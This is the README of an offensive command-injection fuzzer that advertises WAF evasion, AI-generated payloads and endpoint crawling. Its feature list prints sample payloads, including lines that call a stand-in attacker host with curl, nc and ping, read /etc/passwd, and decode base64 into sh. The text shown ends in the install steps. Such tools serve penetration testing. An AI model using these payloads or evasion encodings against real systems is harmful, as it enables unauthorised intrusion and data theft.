# NG-CMD-Injection AI Powered Fuzzer (v6.2)

A next-generation, AI-enhanced **Command Injection vulnerability fuzzer** with both async and sync fallback modes, advanced WAF fingerprinting, and structure-aware payload targeting.

---

## Summary

- **Name**: `NG-CMD-Injection AI Fuzzer`  
- **Version**: 6.2 (May 2025)  
- **Author**: Haroon Ahmad Awan · CyberZeus  
- **Contact**: haroon@cyberzeus.pk  
- **License**: MIT  
- **File**: `ci.py`

---

## Key Features

- **Async & Sync Modes**  
  - Primary async engine using `asyncio`, `aiohttp` & Playwright  
  - Synchronous fallback via `requests` + `ThreadPoolExecutor`  

- **Advanced WAF/IDS Evasion**  
  - Dynamic WAF fingerprinting via ML classifier  
  - Adaptive payload encoding (URL-encode, Unicode escapes) per WAF  

- **AI-Powered Payload Generation**  
  - AI seeded novel payloads  
  - AI mutation of base commands  

- **Structure-Aware Crawling & Fuzzing**  
  - Detects REST, GraphQL, webhook & YAML/CI endpoints  
  - Classifies endpoints (JSON, GraphQL, YAML, etc.) and selects matching payload groups  

- **Comprehensive Injection Categories**  
  - Legacy (in-band, time, DNSlog)  
  - Invented variants: XCI, RICI, EFCI, ICFI, HCI, CVCI, TPCI, UDCI, PPCI, FDI, QCI, BPCI, MSCI, HSCI, NSCI  

- **Comprehensive Injection Categories**  
  - **Legacy**  
    - *In-band*: direct output of commands (e.g. `id` → `uid=`)  
    - *Time*: delay-based detection (e.g. `sleep 5`)  
    - *DNSlog*: out-of-band via DNS beaconing (e.g. `curl http://<dnslog>/$(whoami)`)  
  - **Invented Variants**  
    - **XCI – eXtended Command Injection**  
      Injects inside CLI flags or redirection chains (e.g. `--file=/tmp/$(id)`)  
    - **RICI – Recursive Injection Command Invocation**  
      Double-wrapped/evaluated payloads (e.g. `$(echo $(echo Y2F0IC9...|base64 -d) | sh)`)  
    - **EFCI – Environmental Function Chain Injection**  
      Leverages env vars & eval (e.g. `VAR="curl http://dns"; eval $VAR`)  
    - **ICFI – Input-Controlled Flag Injection**  
      Fakes legitimate flags (e.g. `--user $(ping -c1 attacker.com)`)  
    - **HCI – Header-Controlled Injection**  
      Payloads in HTTP headers (e.g. `User-Agent: $(id)`)  
    - **CVCI – Chained Variable Command Injection**  
      Complex chaining with `&&`, `||`, backticks (e.g. `cmd1 || $(cmd2) && $(cmd3)`)  
    - **TPCI – Type-Punned Command Injection**  
      Misleads type parsers (e.g. injecting into integers: `123;uname -a`)  
    - **UDCI – Unicode-Disguised Command Injection**  
      Obfuscates via Unicode escapes or RTL overrides (e.g. `\u0024\u007B\u0069\u0064\u007D`)  
    - **PPCI – Polyglot Protocol Command Injection**  
      Cross-protocol payloads (e.g. `curl http://127.0.0.1;nc attacker.com 4444`)  
    - **FDI – File Descriptor Injection**  
      Uses FD redirection (e.g. `2>&1; cat /etc/passwd`)  
    - **QCI – Quoted Context Injection**  
      Breaks quoting contexts (e.g. `';uname -a;'`)  
    - **BPCI – Background Process Command Injection**  
      Conceals payloads in background jobs (e.g. `ping -c1 attacker.com &`)  
    - **MSCI – Multi-Stage Chained Injection**  
      Sequential decode & execute (e.g. `eval $(base64 -d <<< ZWNobyAiaWQi)`)  
    - **HSCI – Header-Script Command Injection**  
      Embeds scripts in HTML headers/tags (e.g. `<meta http-equiv="refresh" content="0;url='.../;id'" />`)  
    - **NSCI – Null-Space Command Injection**  
      Exploits IFS or null bytes (e.g. `$(IFS=' ';echo whoami)`, `%00id`)  

- **Payload Obfuscation & Wrappers**  
  - Wrappers: `$(…)`, backticks, `&&`, `||`, `;`  
  - Encodings: Base64, hex, null-byte, URL, double-URL, Unicode escapes  

- **Smart Crawler**  
  - Static HTML & dynamic JS analysis via Playwright  
  - Extracts links, forms, JSON bodies & parameters  

- **Logging & Reporting**  
  - Markdown report (`ng_cmdi_results.md`)  
  - Tagged findings: `IN-BAND`, `TIME` with WAF context  

---

## Installation

```bash
git clone https://github.com/haroonawanofficial/ci.git
cd ci
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt   # aiohttp, playwright, fake-useragent, transformers (optional)
playwright install                # install browsers
